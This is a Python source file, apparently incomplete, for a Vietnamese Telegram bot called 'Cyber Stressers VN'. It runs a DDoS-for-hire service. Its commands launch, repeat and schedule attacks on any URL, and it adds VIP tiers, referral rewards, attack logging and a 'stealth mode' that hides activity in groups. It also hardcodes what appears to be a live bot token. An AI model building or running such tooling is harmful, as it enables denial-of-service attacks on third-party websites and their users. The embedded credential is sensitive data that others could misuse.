"""
========================================
⚡️ CYBER STRESSERS VN - FULL VERSION 2026 ⚡️
Developer & create script:
t.me/zentra999 | t.me/anhba999
========================================
"""
import time
import asyncio
import socket
import os
import sqlite3
import psutil
import random
import string
from urllib import parse
from datetime import datetime, timedelta
from html import escape

import httpx 
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from pytz import timezone

# --- CẤU HÌNH HỆ THỐNG GỐC ---
ORIGINAL_ADMINS = [6365140337] 
TOKEN = os.getenv('BOT_TOKEN', '8869625424:AAG9x0En8xCS7jB1PQsAntwlY86AoEqMcKE') 
DB_FILE = 'bot_database.db'
GROUP_LINK = "https://t.me/srv_down" 
BOT_USERNAME = "CyberStressersVN_Bot"  

active_users = {}      
user_cooldowns = {}    
scheduled_tasks = {}
looping_tasks = {}

async_client = httpx.AsyncClient(timeout=10.0, follow_redirects=True)

# --- DATABASE LOGIC ---
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('CREATE TABLE IF NOT EXISTS methods (name TEXT PRIMARY KEY, type TEXT, url TEXT, time INTEGER, visibility TEXT, command TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS groups_allowed (group_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS blacklist (domain TEXT PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS private_allowed (user_id INTEGER PRIMARY KEY)')
        c.execute('CREATE TABLE IF NOT EXISTS attack_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, target TEXT, method TEXT, duration INTEGER, time_at TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS joined_users (user_id INTEGER PRIMARY KEY, referred_by INTEGER DEFAULT 0, ref_count INTEGER DEFAULT 0)')
        c.execute('CREATE TABLE IF NOT EXISTS member_daily_quota (user_id INTEGER PRIMARY KEY, quota_left INTEGER, last_attack_date TEXT)')
        
        c.execute('CREATE TABLE IF NOT EXISTS vip_packages (package_name TEXT PRIMARY KEY, max_time INTEGER, quota INTEGER, can_spam INTEGER, can_schedule INTEGER, cooldown INTEGER, max_concurrent INTEGER)')
        c.execute('CREATE TABLE IF NOT EXISTS vip_users (user_id KEY PRIMARY KEY, package_name TEXT, custom_max_time INTEGER DEFAULT NULL, custom_quota INTEGER DEFAULT NULL, custom_cooldown INTEGER DEFAULT NULL, custom_max_concurrent INTEGER DEFAULT NULL)')

        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("bot_active", "1")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("stealth_mode", "1")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_cooldown", "30")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_max_concurrent", "3")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_global_max_time", "60")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("member_daily_limit", "10")')
        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("ref_needed_for_vip", "5")')
        c.execute('INSERT OR IGNORE INTO vip_packages VALUES ("VIP1", 120, 50, 1, 1, 15, 5)')
        conn.commit()

def db_query(query, params=(), fetch=False):
    try:
        with sqlite3.connect(DB_FILE, timeout=20) as conn:
            c = conn.cursor()
            c.execute(query, params)
            conn.commit()
            if fetch: return c.fetchall()
    except sqlite3.Error as e:
        print(f"⚙️ Database Error: {e}")
        return [] if fetch else None

async def tele_backup_db(context):
    try:
        if os.path.exists(DB_FILE):
            for admin_id in ORIGINAL_ADMINS:
                with open(DB_FILE, 'rb') as db_file:
                    await context.bot.send_document(
                        chat_id=admin_id,
                        document=db_file,
                        filename=DB_FILE,
                        caption=f"⚡️ <b>[AUTO BACKUP]</b>\nĐã đồng bộ Cơ sở dữ liệu mới nhất!\n🕒 Thời gian: <code>{get_thoi_gian_vn()}</code>",
                        parse_mode='HTML'
                    )
    except Exception as e: print(f"Lỗi gửi file Tele backup: {e}")

def is_admin(user_id):
    if user_id in ORIGINAL_ADMINS: return True
    res = db_query('SELECT user_id FROM admins WHERE user_id=?', (user_id,), fetch=True)
    return bool(res)

def check_private_allowed(user_id):
    if is_admin(user_id): return True
    res = db_query('SELECT user_id FROM private_allowed WHERE user_id=?', (user_id,), fetch=True)
    return bool(res)

def log_attack(user_id, username, target, method, duration):
    time_vn = get_thoi_gian_vn()
    db_query('INSERT INTO attack_logs (user_id, username, target, method, duration, time_at) VALUES (?, ?, ?, ?, ?, ?)', 
             (user_id, username, target, method, duration, time_vn))

def get_bot_state():
    res = db_query('SELECT value FROM settings WHERE key="bot_active"', fetch=True)
    return res[0][0] == "1" if res else True

def set_bot_state(active):
    db_query('UPDATE settings SET value=? WHERE key="bot_active"', ("1" if active else "0",))

def get_stealth_mode():
    res = db_query('SELECT value FROM settings WHERE key="stealth_mode"', fetch=True)
    return res[0][0] == "1" if res else False

def set_stealth_mode(active):
    db_query('REPLACE INTO settings (key, value) VALUES ("stealth_mode", ?)', ("1" if active else "0",))

def get_system_setting(key, default_val):
    res = db_query('SELECT value FROM settings WHERE key=?', (key,), fetch=True)
    return res[0][0] if res else default_val

def get_all_methods():
    rows = db_query('SELECT name, type, url, time, visibility, command FROM methods', fetch=True)
    return {r[0]: {'type': r[1], 'url': r[2], 'time': r[3], 'visibility': r[4], 'command': r[5]} for r in rows}

def check_vip_status(user_id):
    res = db_query('SELECT user_id FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
    return bool(res)

def get_vip_config(user_id):
    res = db_query('SELECT package_name, custom_max_time, custom_quota, custom_cooldown, custom_max_concurrent FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
    if not res: return None
    package_name, c_time, c_quota, c_cooldown, c_concurrent = res[0]
    pkg_res = db_query('SELECT max_time, quota, can_spam, can_schedule, cooldown, max_concurrent FROM vip_packages WHERE package_name=?', (package_name,), fetch=True)
    if not pkg_res: return None 
    p_time, p_quota, p_spam, p_sch, p_cooldown, p_concurrent = pkg_res[0]
    return {
        'package': package_name,
        'max_time': c_time if c_time is not None else p_time,
        'quota': c_quota if c_quota is not None else p_quota,
        'can_spam': p_spam,
        'can_schedule': p_sch,
        'cooldown': c_cooldown if c_cooldown is not None else p_cooldown,
        'max_concurrent': c_concurrent if c_concurrent is not None else p_concurrent
    }

def get_user_cooldown(user_id):
    if is_admin(user_id): return 0
    vip_cfg = get_vip_config(user_id)
    if vip_cfg: return vip_cfg['cooldown']
    res = db_query('SELECT value FROM settings WHERE key="member_cooldown"', fetch=True)
    return int(res[0][0]) if res else 30

def get_running_tasks_count(user_id):
    if is_admin(user_id): return 0
    return sum(1 for u_id, status in active_users.items() if u_id == user_id and status is True)

def check_and_update_member_quota(user_id):
    current_date = datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%Y')
    max_daily = int(get_system_setting("member_daily_limit", "10"))
    res = db_query('SELECT quota_left, last_attack_date FROM member_daily_quota WHERE user_id=?', (user_id,), fetch=True)
    if not res:
        db_query('INSERT INTO member_daily_quota (user_id, quota_left, last_attack_date) VALUES (?, ?, ?)', (user_id, max_daily - 1, current_date))
        return max_daily - 1
    quota_left, last_attack_date = res[0]
    if last_attack_date != current_date:
        db_query('UPDATE member_daily_quota SET quota_left = ?, last_attack_date = ? WHERE user_id = ?', (max_daily - 1, current_date, user_id))
        return max_daily - 1
    else:
        if quota_left <= 0: return -1
        new_quota = quota_left - 1
        db_query('UPDATE member_daily_quota SET quota_left = ? WHERE user_id = ?', (new_quota, user_id))
        return new_quota

async def lay_ip_va_isp(url):
    try:
        loop = asyncio.get_running_loop()
        hostname = parse.urlsplit(url).netloc
        ip = await loop.run_in_executor(None, socket.gethostbyname, hostname)
        response = await async_client.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.status_code == 200 else {}
    except Exception: return None, {}

def get_thoi_gian_vn(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S | %d-%m-%Y')

async def check_private_block(update):
    user_id = update.message.from_user.id
    if update.message.chat.type == 'private' and not is_admin(user_id) and not check_private_allowed(user_id):
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Tham gia Nhóm sử dụng Bot", url=GROUP_LINK)]])
        await update.message.reply_text(
            "⚡️ ─── [ SYSTEM MANAGEMENT BAN ] ─── ⚡️\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>THÔNG BÁO HỆ THỐNG CHẶN LỆNH</b>\n\n"
            "Để bảo vệ tài nguyên VPS, các lệnh điều khiển tấn công chỉ được thực thi trực tiếp tại Nhóm chính thức hoặc yêu cầu tài khoản được cấp quyền.\n"
            "👉 Vui lòng vào nhóm để sử dụng!", 
            parse_mode='HTML', reply_markup=kb
        )
        return True
    return False

async def toggle_botro(update, context):
    if not is_admin(update.message.from_user.id): return
    current_mode = get_stealth_mode()
    new_mode = not current_mode
    set_stealth_mode(new_mode)
    status_text = "🟢 BẬT (Bơ tất cả mọi người trong Group)" if new_mode else "🔴 TẮT (Trả lời công khai trong Group)"
    await update.message.reply_text(f"👻 <b>CÔNG TẮC /BOTRO:</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\nTrạng thái: <code>{status_text}</code>", parse_mode='HTML')

async def thong_tin_vip(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 

    if is_admin(user_id):
        return await update.message.reply_text("👑 <b>Bạn là ADMIN:</b>\nĐặc quyền vô hạn.", parse_mode='HTML')
    
    vip_cfg = get_vip_config(user_id)
    ref_data = db_query('SELECT ref_count FROM joined_users WHERE user_id=?', (user_id,), fetch=True)
    current_refs = ref_data[0][0] if ref_data else 0
    ref_needed = int(get_system_setting("ref_needed_for_vip", "5"))

    if vip_cfg:
        spam_st = "✅ Cho phép" if vip_cfg['can_spam'] else "❌ Bị cấm"
        sch_st = "✅ Cho phép" if vip_cfg['can_schedule'] else "❌ Bị cấm"
        await update.message.reply_text(
            "⚡️ ⚡️ ⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️ ⚡️ ⚡️\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "👑 <b>💎 HỒ SƠ ĐẶC QUYỀN VIP 💎</b>\n\n"
            f" ├── 🆔 <b>Mã Định Danh ID:</b> <code>{user_id}</code>\n"
            f" ├── 📦 <b>Cấp Độ Gói:</b> <code>{vip_cfg['package']}</code>\n"
            f" ├── ⏳ <b>Thời Gian Tối Đa:</b> Duy trì <code>{vip_cfg['max_time']}s</code> / Lượt\n"
            f" ├── 🚀 <b>Kho Đạn Quota:</b> Còn <code>{vip_cfg['quota']}</code> lượt khai hỏa\n"
            f" ├── 🔄 <b>Quyền Auto-Spam:</b> {spam_st}\n"
            f" ├── ⏰ <b>Quyền Đặt Lịch:</b> {sch_st}\n"
            f" ├── 📶 <b>Băng Thông Đồng Thời:</b> Tối đa <code>{vip_cfg['max_concurrent']}</code> luồng\n"
            f" ├── 👥 <b>Đã Giới Thiệu:</b> <code>{current_refs}</code> người\n"
            f" └── ❄️ <b>HỆ THỐNG LÀM MÁT:</b> Nghỉ <code>{vip_cfg['cooldown']}s</code> giữa các đợt\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <i>Tài khoản của bạn đang nắm giữ gói tài nguyên VIP cao cấp!</i>", 
            parse_mode='HTML'
        )
    else:
        dm_cooldown = get_user_cooldown(user_id)
        mmc = get_system_setting("member_max_concurrent", "3")
        daily_max = get_system_setting("member_daily_limit", "10")
        mq_res = db_query('SELECT quota_left, last_attack_date FROM member_daily_quota WHERE user_id=?', (user_id,), fetch=True)
        current_date = datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%Y')
        current_left = mq_res[0][0] if mq_res and mq_res[0][1] == current_date else daily_max

        await update.message.reply_text(
            "⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "👤 <b>MEMBER STANDARD PROFILE</b>\n\n"
            f" ├── 📶 <b>Luồng Đồng Thời:</b> Tối đa <code>{mmc} luồng</code>\n"
            f" ├── 📅 <b>Hạn Mức Hôm Nay:</b> Còn <code>{current_left}/{daily_max}</code> lượt (Reset 00h)\n"
            f" ├── 👥 <b>Đã Giới Thiệu:</b> <code>{current_refs}/{ref_needed}</code> người\n"
            f" └── ❄️ <b>Thời Gian Nghỉ:</b> <code>{dm_cooldown}s</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <i>Mời đủ {ref_needed} người tham gia link ref để tự động mở khóa VIP1 MIỄN PHÍ!</i>",
            parse_mode='HTML'
        )

async def check_website(update, context):
    if await check_private_block(update): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 
    
    if len(context.args) < 1: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/check [url]</code>", parse_mode='HTML')
    url = context.args[0]
    if not url.startswith(('http://', 'https://')): url = 'https://' + url
    sent_msg = await update.message.reply_text(f"🔍 <b>Đang phân tích:</b> <code>{url}</code>...", parse_mode='HTML')
    try:
        st = time.time()
        resp = await async_client.get(url)
        ms = round((time.time() - st) * 1000, 2)
        sc = resp.status_code
        icon = "🟢" if 200 <= sc < 300 else "🟡" if sc < 400 else "🔴"
        res = f"🌐 <b>NETWORK SCANNER</b> 🌐\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n🎯 <b>Mục tiêu:</b> <code>{url}</code>\n🚦 <b>Trạng thái:</b> {icon} <code>{sc}</code>\n⚡ <b>Ping:</b> <code>{ms}ms</code>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
    except Exception: 
        res = "❌ <b>LỖI KẾT NỐI</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⚠️ <i>Host không phản hồi.</i>"
    await sent_msg.edit_text(res, parse_mode='HTML')

async def danh_sach_phuong_thuc(update, context):
    if await check_private_block(update): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return 
    
    methods_data = get_all_methods()
    if not methods_data: 
        return await update.message.reply_text("📭 <b>System database is empty. No methods found.</b>", parse_mode='HTML')
    
    msg = (
        "⚡️ ⚡️ ⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️ ⚡️ ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🧬 <b>FIREPOWER METHODS & ARSENAL LIST</b>\n\n"
    )
    
    vip, free = [], []
    for name, data in methods_data.items():
        # Định dạng dòng phương thức chuẩn quốc tế
        line = f" ├─ 🧨 <code>{name.ljust(12)}</code> ── Type: {data.get('type', 'UNK').ljust(4)} │ Max: {data['time']}s"
        
        if data.get('visibility') == 'VIP':
            vip.append(line)
        else:
            free.append(line)
            
    if vip: 
        # Tự động bo góc dòng cuối cùng của nhóm VIP
        vip[-1] = vip[-1].replace("├─", "└─")
        msg += "👑 <b>[ PREMIUM ARSENAL / VIP ONLY ]</b>\n" + "\n".join(vip) + "\n\n"
        
    if free: 
        # Tự động bo góc dòng cuối cùng của nhóm FREE
        free[-1] = free[-1].replace("├─", "└─")
        msg += "🔰 <b>[ STANDARD ARSENAL / FREE TIER ]</b>\n" + "\n".join(free) + "\n"
        
    msg += (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 <i>Tip: Upgrade to VIP account to unlock heavy tactical weapons!</i>"
    )
    
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_group(update, context):
    is_private = update.message.chat.type == 'private'
    user_id = update.message.from_user.id
    if get_stealth_mode() and not is_private: return 
    
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"

    if is_private and context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].split('_')[1])
            check_user = db_query('SELECT user_id FROM joined_users WHERE user_id=?', (user_id,), fetch=True)
            
            if not check_user and referrer_id != user_id:
                db_query('INSERT INTO joined_users (user_id, referred_by, ref_count) VALUES (?, ?, 0)', (user_id, referrer_id))
                db_query('INSERT OR IGNORE INTO joined_users (user_id, referred_by, ref_count) VALUES (?, 0, 0)', (referrer_id,))
                db_query('UPDATE joined_users SET ref_count = ref_count + 1 WHERE user_id = ?', (referrer_id,))
                
                ref_res = db_query('SELECT ref_count FROM joined_users WHERE user_id = ?', (referrer_id,), fetch=True)
                current_refs = ref_res[0][0] if ref_res else 0
                ref_needed = int(get_system_setting("ref_needed_for_vip", "5"))
                
                if current_refs >= ref_needed and not check_vip_status(referrer_id):
                    db_query('REPLACE INTO vip_users (user_id, package_name) VALUES (?, "VIP1")', (referrer_id,))
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"⚡️ <b>Cyber Stressers VN NOTICE</b> ⚡️\n━━━━━━━━━━━━━━━━━━━━\n"
                                 f"🎉 Chúc mừng! Bạn đã giới thiệu thành công (<b>{current_refs}/{ref_needed}</b>) người.\n"
                                 f"👑 Hệ thống đã tự động kích hoạt **GÓI VIP1** miễn phí cho tài khoản của bạn!",
                            parse_mode='HTML'
                        )
                    except Exception: pass
                else:
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"⚡️ <b>Cyber Stressers VN REPORT</b> ⚡️\n━━━━━━━━━━━━━━━━━━━━\n"
                                 f"👤 Thành viên mới kích hoạt qua link ref của bạn.\n"
                                 f"📊 Tiến trình: <b>{current_refs}/{ref_needed}</b> người. Đạt mốc để nhận gói VIP1 miễn phí!",
                            parse_mode='HTML'
                        )
                    except Exception: pass
                await tele_backup_db(context)
        except Exception as e: print(f"Lỗi ref: {e}")

    if is_private: db_query('INSERT OR IGNORE INTO joined_users (user_id, referred_by, ref_count) VALUES (?, 0, 0)', (user_id,))

    help_text = (
        "⚡️ ⚡️ ⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️ ⚡️ ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 𝑊𝑒𝑙𝑐𝑜𝑚𝑒, <code>{username}</code>\n"
        "🎯 [ COMMAND CENTER / MAIN PANEL ]\n\n"
        "🚀 FIRE CONTROL (ATTACK MANAGEMENT):\n"
        " ├─ 🧨 <code>/attack</code> ── [method] [url] [time]\n"
        " ├─ 🔄 <code>/spam</code> ── [method] [url] [time]\n"
        " ├─ 🛑 <code>/stopspam</code> ── stop vòng lặp spam\n"
        " ├─ 📅 <code>/schedule</code> ── lịch trình tấn công [HH:MM]\n"
        " ├─ 🗓 <code>/schedule spam</code> ── lịch trình auto spam\n"
        " ├─ 🗑 <code>/delschedule</code> ── Hủy nhiệm vụ [Mã Task]\n"
        " └─ 🧯 <code>/pkill</code> ── stop tấn công\n\n"
        "📡 CƠ SỞ DỮ LIỆU & TIỆN ÍCH:\n"
        " ├─ 🪪 <code>/me</code> ── Hồ sơ đặc quyền cá nhân\n"
        " ├─ 🛰 <code>/check</code> ── trạng thái Host\n"
        " └─ 🧬 <code>/methods</code> ── phương pháp tấn công hiện có\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎁 [ CHIẾN DỊCH QUẢNG BÁ - ĐỔI VIP TỰ ĐỘNG ]\n"
        f"🔗 Link quân nhu của bạn: <code>{ref_link}</code>\n"
        "💡 Mời đồng đội tham gia bot để mở khóa gói VIP1 hoàn toàn MIỄN PHÍ!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📶 𝑆𝑦𝑠𝑡𝑒𝑚 𝑆𝑡𝑎𝑡𝑢𝑠: ONLINE | 🔋 𝑇ℎ𝑟𝑒𝑎𝑑𝑠: ACTIVE"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👨‍💻 Liên Hệ Admin", url="https://t.me/zentra999")]])
    await update.message.reply_text(help_text, parse_mode='HTML', reply_markup=kb, disable_web_page_preview=True)

# --- PANEL: LÊN LỊCH & HỦY LỊCH ---
async def dat_lich(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'

    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")

    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")

    vip_cfg = get_vip_config(user_id)
    is_vip = vip_cfg is not None

    if not is_admin(user_id):
        user_max_concurrent = vip_cfg['max_concurrent'] if is_vip else int(get_system_setting("member_max_concurrent", 3))
        if get_running_tasks_count(user_id) >= user_max_concurrent:
            return await reply_error(f"⚠️ <b>Bạn đã đạt giới hạn luồng chạy song song (Tối đa {user_max_concurrent} luồng)!</b>")

    if not is_admin(user_id):
        if not is_vip: return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")
        if not vip_cfg['can_schedule']: return await reply_error("🚫 <b>Tài khoản của bạn KHÔNG được cấp quyền Đặt lịch!</b>")

    args = context.args
    is_schedule_spam = False
    if len(args) > 0 and args[0].lower() == 'spam':
        is_schedule_spam = True
        args = args[1:]

    if len(args) < 3: 
        return await reply_error("⚠️ <b>Cú pháp đặt lịch:</b>\n"
                                 "👉 Thường: <code>/schedule [HH:MM] [method] [url] [time]</code>\n"
                                 "👉 Auto Spam: <code>/schedule spam [HH:MM] [method] [url] [time]</code>")

    time_str, method_name, url = args[0], args[1], args[2]
    methods_data = get_all_methods()
    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
    method = methods_data[method_name]

    if method['visibility'] == 'VIP' and not is_admin(user_id) and not is_vip: 
        return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")

    if is_schedule_spam and not is_admin(user_id) and is_vip and not vip_cfg['can_spam']:
        return await reply_error("🚫 <b>Bạn không có quyền sử dụng tính năng Auto Spam!</b>")

    attack_time = method['time']
    if len(args) > 3:
        try: attack_time = int(args[3])
        except ValueError: pass

    if not is_admin(user_id) and not is_vip:
        sys_global_max_time = int(get_system_setting("member_global_max_time", 60))
        if attack_time > sys_global_max_time: attack_time = sys_global_max_time
        left_quota = check_and_update_member_quota(user_id)
        if left_quota == -1: return await reply_error("❌ <b>Bạn đã sử dụng hết số lượt tấn công trong ngày!</b>")

    if not is_admin(user_id) and is_vip:
        if vip_cfg['quota'] <= 0: return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt!</b>")
        if attack_time > vip_cfg['max_time']: attack_time = vip_cfg['max_time']
        db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id))
        await tele_backup_db(context)

    try:
        vn_tz = timezone('Asia/Ho_Chi_Minh')
        now = datetime.now(vn_tz)
        naive_target = datetime.strptime(time_str, "%H:%M").replace(year=now.year, month=now.month, day=now.day)
        target_time = vn_tz.localize(naive_target)
        if target_time <= now: target_time = target_time + timedelta(days=1)
        delay_seconds = (target_time - now).total_seconds()
    except ValueError:
        if not is_admin(user_id):
            if is_vip: db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (user_id,))
            else: db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (user_id,))
        return await reply_error("⚠️ <b>Định dạng thời gian sai!</b>")
        
    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: 
        if not is_admin(user_id):
            if is_vip: db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (user_id,))
            else: db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (user_id,))
        return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")

    ip, isp_info = await lay_ip_va_isp(url)
    if not ip: 
        if not is_admin(user_id):
            if is_vip: db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (user_id,))
            else: db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (user_id,))
        return await reply_error("🌐 <b>Lỗi DNS.</b>")

    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    username = update.message.from_user.username or update.message.from_user.full_name

    task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    loai_lich = "KÍCH HOẠTH SPAM" if is_schedule_spam else "TẤN CÔNG THƯỜNG"
    await reply_error(f"✅ <b>[TIMER SET - {loai_lich}]</b> Đã đặt lịch hẹn.\n⏰ Kích hoạt: <code>{target_time.strftime('%H:%M | %d/%m')}</code>\n🆔 <b>Mã Hủy:</b> <code>{task_id}</code>")

    task = asyncio.create_task(run_scheduled_attack(delay_seconds, cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id, is_schedule_spam))
    scheduled_tasks[task_id] = {'task': task, 'user_id': user_id, 'target': url}

async def huy_lich(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if len(context.args) < 1: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/delschedule [Mã Task]</code>")
    task_id = context.args[0].upper()

    if task_id not in scheduled_tasks: return await reply_error("❌ <b>Không tìm thấy mã lịch hẹn!</b>")
    task_info = scheduled_tasks[task_id]
    
    if task_info['user_id'] != user_id and not is_admin(user_id): 
        return await reply_error("🚫 <b>Bạn không có quyền hủy lịch của người khác!</b>")

    task_info['task'].cancel()
    del scheduled_tasks[task_id]
    
    if not is_admin(user_id):
        if check_vip_status(task_info['user_id']):
            db_query('UPDATE vip_users SET custom_quota = custom_quota + 1 WHERE user_id=?', (task_info['user_id'],))
        else:
            db_query('UPDATE member_daily_quota SET quota_left = quota_left + 1 WHERE user_id=?', (task_info['user_id'],))
        
    await reply_error(f"🗑 <b>Đã hủy bỏ lịch hẹn:</b> <code>{task_id}</code>")
    await tele_backup_db(context)

async def run_scheduled_attack(delay, command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id, is_schedule_spam):
    try: await asyncio.sleep(delay)
    except asyncio.CancelledError: return 

    if task_id in scheduled_tasks: del scheduled_tasks[task_id]
    current_stealth = get_stealth_mode()
    
    if is_schedule_spam:
        dashboard = (
            "⏰ <b>[AUTO RUN] TỚI GIỜ HẸN -> KÍCH HOẠT AUTO SPAM</b> ⏰\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"👤 <b>Operator:</b> <code>@{escape(username)}</code>\n🎯 <b>Target:</b> <code>{url}</code>\n"
            f"🔥 <b>Method:</b> <code>{method_name.upper()}</code>\n⏱ <b>Mỗi phát bắn:</b> <code>{attack_time}s</code>"
        )
    else:
        dashboard = (
            "⏰ <b>[AUTO RUN] TỚI GIỜ LÊN LỊCH TẤN CÔNG</b> ⏰\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"👤 <b>Operator:</b> <code>@{escape(username)}</code>\n🎯 <b>Target:</b> <code>{url}</code>\n"
            f"🔥 <b>Method:</b> <code>{method_name.upper()}</code>\n⏳ <b>Thời gian bắn:</b> <code>{attack_time}s</code>"
        )

    if current_stealth and not is_private:
        for admin in ORIGINAL_ADMINS:
            try: await context.bot.send_message(chat_id=admin, text=dashboard, parse_mode='HTML')
            except Exception: pass
    else:
        try: await update.message.reply_text(dashboard, parse_mode='HTML')
        except Exception: pass

    log_attack(user_id, username, url, method_name, attack_time)

    if is_schedule_spam:
        if user_id in looping_tasks: looping_tasks[user_id]['task'].cancel()
        task = asyncio.create_task(run_spam_loop(command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private))
        looping_tasks[user_id] = {'task': task, 'target': url}
    else:
        await thuc_hien_tan_cong(command, update, method_name, context, user_id, current_stealth, is_private)

# --- PANEL: AUTO SPAM ---
async def bat_spam(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")
        
    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")

    vip_cfg = get_vip_config(user_id)
    is_vip = vip_cfg is not None

    if not is_admin(user_id):
        user_max_concurrent = vip_cfg['max_concurrent'] if is_vip else int(get_system_setting("member_max_concurrent", 3))
